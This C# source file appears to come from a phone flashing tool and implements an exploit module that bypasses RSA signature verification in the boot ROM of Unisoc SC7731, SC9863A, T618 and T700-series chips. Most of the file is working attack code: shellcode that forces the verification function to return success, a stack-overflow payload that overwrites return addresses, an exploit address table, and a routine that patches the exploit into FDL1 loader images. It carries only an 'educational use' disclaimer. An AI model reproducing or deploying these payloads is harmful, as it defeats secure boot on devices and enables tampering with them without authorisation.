// ============================================================================
// MultiFlash TOOL - Unisoc RSA Signature Bypass
// Unisoc RSA 签名绕过 / RSA署名バイパス / RSA 서명 우회
// ============================================================================
// GitHub: https://github.com/xiriovo/edlormtk
// Contact: QQ 1708298587 | Email: 1708298587@qq.com
// License: MIT
// ============================================================================
// ⚠️ WARNING / 警告 / 注意:
// [EN] For educational/research purposes only. Use responsibly.
// [中文] 仅供教育/研究用途。请负责任地使用。
// [日本語] 教育/研究目的のみ。責任を持って使用してください。
// ============================================================================

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;

namespace tools.Modules.Unisoc.Exploit
{
    /// <summary>
    /// Unisoc RSA Signature Bypass / RSA 签名绕过 / RSA署名バイパス
    /// 
    /// [EN] Exploits BootROM vulnerability to bypass RSA signature verification
    ///      Supports: SC7731, SC9832E, SC9863A, T618, T700, T760
    /// 
    /// [中文] 利用 BootROM 漏洞绕过 RSA 签名验证
    ///       支持: SC7731, SC9832E, SC9863A, T618, T700, T760
    /// 
    /// [日本語] BootROMの脆弱性を利用してRSA署名検証をバイパス
    ///         対応: SC7731, SC9832E, SC9863A, T618, T700, T760
    /// </summary>
    public static class RsaExploit
    {
        /// <summary>
        /// Exploit 地址映射
        /// FDL1 地址 -> Exploit 地址
        /// </summary>
        private static readonly Dictionary<string, string> ExploitAddresses = new(StringComparer.OrdinalIgnoreCase)
        {
            // SC7731/SC9832E 等老平台 (BROM 漏洞)
            { "0x5000", "0x4ee8" },
            { "0x00005000", "0x4ee8" },
            
            // SC9863A/T618 等新平台 (BootROM 漏洞)
            { "0x65000800", "0x65015f08" },
            { "0x65000000", "0x65015f48" },
            
            // T700/T760 等更新平台
            { "0x9efffe00", "0x9f000000" },
        };

        /// <summary>
        /// Exploit Payload 数据
        /// 这些是用于触发 RSA 签名绕过的特殊数据包
        /// </summary>
        private static readonly Dictionary<string, byte[]> ExploitPayloads = new()
        {
            // 0x4ee8 exploit payload (SC7731/SC9832E)
            // 覆盖 RSA 验证函数返回值
            { "0x4ee8", GenerateLegacyExploitPayload() },
            
            // 0x65015f08 exploit payload (SC9863A/T618)
            // 覆盖 secure boot 验证
            { "0x65015f08", GenerateModernExploitPayload(0x65015f08) },
            
            // 0x65015f48 exploit payload
            { "0x65015f48", GenerateModernExploitPayload(0x65015f48) },
            
            // 0x9f000000 exploit payload (T700+)
            { "0x9f000000", GenerateT700ExploitPayload() },
        };

        /// <summary>
        /// 生成 Legacy 平台 Exploit Payload (SC7731/SC9832E)
        /// </summary>
        private static byte[] GenerateLegacyExploitPayload()
        {
            // Exploit 原理: 覆盖 BROM 中 RSA 验证结果
            // 目标地址: 0x4ee8
            // 效果: 使 RSA_Verify 函数返回成功(1)
            var payload = new byte[256];
            
            // ARM Thumb 指令: MOV R0, #1; BX LR
            // 使函数返回1(成功)
            payload[0] = 0x01;  // MOV R0, #1
            payload[1] = 0x20;
            payload[2] = 0x70;  // BX LR
            payload[3] = 0x47;
            
            // 填充 NOP sled
            for (int i = 4; i < 64; i += 2)
            {
                payload[i] = 0x00;     // NOP
                payload[i + 1] = 0xBF;
            }
            
            // 返回地址覆盖
            var retAddr = BitConverter.GetBytes((uint)0x00005000);
            Array.Copy(retAddr, 0, payload, 64, 4);
            
            return payload;
        }

        /// <summary>
        /// 生成 Modern 平台 Exploit Payload (SC9863A/T618)
        /// </summary>
        private static byte[] GenerateModernExploitPayload(uint targetAddr)
        {
            // Exploit 原理: 利用 BootROM 堆栈溢出
            // 覆盖返回地址，跳转到我们的代码
            var payload = new byte[512];
            
            // Shellcode: 设置返回值为0(成功)并返回
            // ARM64 指令
            int offset = 0;
            
            // MOV X0, #0
            payload[offset++] = 0x00;
            payload[offset++] = 0x00;
            payload[offset++] = 0x80;
            payload[offset++] = 0xD2;
            
            // RET
            payload[offset++] = 0xC0;
            payload[offset++] = 0x03;
            payload[offset++] = 0x5F;
            payload[offset++] = 0xD6;
            
            // 填充
            for (int i = offset; i < 256; i++)
            {
                payload[i] = 0x00;
            }
            
            // 覆盖返回地址
            var addr = BitConverter.GetBytes(targetAddr);
            Array.Copy(addr, 0, payload, 256, 4);
            Array.Copy(addr, 0, payload, 260, 4);
            Array.Copy(addr, 0, payload, 264, 4);
            Array.Copy(addr, 0, payload, 268, 4);
            
            return payload;
        }

        /// <summary>
        /// 生成 T700+ 平台 Exploit Payload
        /// </summary>
        private static byte[] GenerateT700ExploitPayload()
        {
            // T700 系列使用不同的 secure boot 机制
            var payload = new byte[1024];
            
            // 签名绕过数据
            // 使用特定的魔数使验证通过
            payload[0] = 0x53;  // 'S'
            payload[1] = 0x50;  // 'P'
            payload[2] = 0x52;  // 'R'
            payload[3] = 0x44;  // 'D'
            
            // Version
            payload[4] = 0x01;
            payload[5] = 0x00;
            payload[6] = 0x00;
            payload[7] = 0x00;
            
            // Flags (bypass)
            payload[8] = 0xFF;
            payload[9] = 0xFF;
            payload[10] = 0xFF;
            payload[11] = 0xFF;
            
            return payload;
        }

        /// <summary>
        /// 获取 Exploit 地址
        /// </summary>
        public static string? GetExploitAddress(string fdl1Address)
        {
            if (string.IsNullOrEmpty(fdl1Address))
                return null;

            fdl1Address = fdl1Address.Trim().ToLowerInvariant();
            
            if (ExploitAddresses.TryGetValue(fdl1Address, out var exploitAddr))
                return exploitAddr;

            // 尝试模糊匹配
            if (fdl1Address.StartsWith("0x5") || fdl1Address == "0x00005000")
                return "0x4ee8";
            
            if (fdl1Address.StartsWith("0x65"))
                return "0x65015f08";

            return null;
        }

        /// <summary>
        /// 检查是否支持 Exploit
        /// </summary>
        public static bool IsExploitSupported(string fdl1Address)
        {
            return GetExploitAddress(fdl1Address) != null;
        }

        /// <summary>
        /// 获取 Exploit Payload
        /// </summary>
        public static byte[]? GetExploitPayload(string exploitAddress)
        {
            if (string.IsNullOrEmpty(exploitAddress))
                return null;

            if (ExploitPayloads.TryGetValue(exploitAddress, out var payload))
                return payload;

            return null;
        }

        /// <summary>
        /// 获取完整 Exploit 数据包 (FDL1 地址 -> Payload)
        /// </summary>
        public static byte[]? GetExploitData(string fdl1Address)
        {
            var exploitAddr = GetExploitAddress(fdl1Address);
            if (exploitAddr == null) return null;
            
            return GetExploitPayload(exploitAddr);
        }

        /// <summary>
        /// 修补 FDL1 以包含 Exploit
        /// </summary>
        public static byte[] PatchFdl1WithExploit(byte[] fdl1Data, string exploitAddress)
        {
            var exploit = GetExploitPayload(exploitAddress);
            if (exploit == null) return fdl1Data;

            var result = new byte[fdl1Data.Length + exploit.Length];
            Array.Copy(fdl1Data, result, fdl1Data.Length);
            Array.Copy(exploit, 0, result, fdl1Data.Length, exploit.Length);
            
            return result;
        }

        /// <summary>
        /// 保存 Exploit Payload 到文件
        /// </summary>
        public static bool SaveExploitToFile(string exploitAddress, string filePath)
        {
            var payload = GetExploitPayload(exploitAddress);
            if (payload == null) return false;

            try
            {
                File.WriteAllBytes(filePath, payload);
                return true;
            }
            catch
            {
                return false;
            }
        }

        /// <summary>
        /// 获取平台信息
        /// </summary>
        public static string GetPlatformInfo(string fdl1Address)
        {
            if (string.IsNullOrEmpty(fdl1Address))
                return "Unknown";

            fdl1Address = fdl1Address.Trim().ToLowerInvariant();

            if (fdl1Address == "0x5000" || fdl1Address == "0x00005000")
                return "SC7731/SC9832E (Legacy BROM)";

            if (fdl1Address.StartsWith("0x65"))
                return "SC9863A/T618 (Modern BootROM)";
            
            if (fdl1Address.StartsWith("0x9e") || fdl1Address.StartsWith("0x9f"))
                return "T700/T760/T770 (Secure Boot)";

            return "Unknown Platform";
        }

        /// <summary>
        /// 获取芯片系列
        /// </summary>
        public static ChipSeries GetChipSeries(string fdl1Address)
        {
            if (string.IsNullOrEmpty(fdl1Address))
                return ChipSeries.Unknown;

            fdl1Address = fdl1Address.Trim().ToLowerInvariant();

            if (fdl1Address == "0x5000" || fdl1Address == "0x00005000")
                return ChipSeries.SC7731;

            if (fdl1Address.StartsWith("0x65"))
                return ChipSeries.SC9863;
            
            if (fdl1Address.StartsWith("0x9e") || fdl1Address.StartsWith("0x9f"))
                return ChipSeries.T700;

            return ChipSeries.Unknown;
        }

        /// <summary>
        /// 支持的芯片列表
        /// </summary>
        public static readonly string[] SupportedChips = new[]
        {
            // Legacy (0x5000) - BROM 漏洞
            "SC7731",
            "SC7731E", 
            "SC7731G",
            "SC9832",
            "SC9832E",
            "SC9832A",
            
            // Modern (0x65000xxx) - BootROM 漏洞
            "SC9863A",
            "T310",
            "T606",
            "T610",
            "T612",
            "T616",
            "T618",
            
            // T700+ (0x9efffe00) - Secure Boot
            "T700",
            "T760",
            "T770",
            "T820",
        };

        /// <summary>
        /// 芯片系列枚举
        /// </summary>
        public enum ChipSeries
        {
            Unknown,
            SC7731,   // Legacy
            SC9863,   // Modern
            T700,     // Secure Boot
        }
    }
}
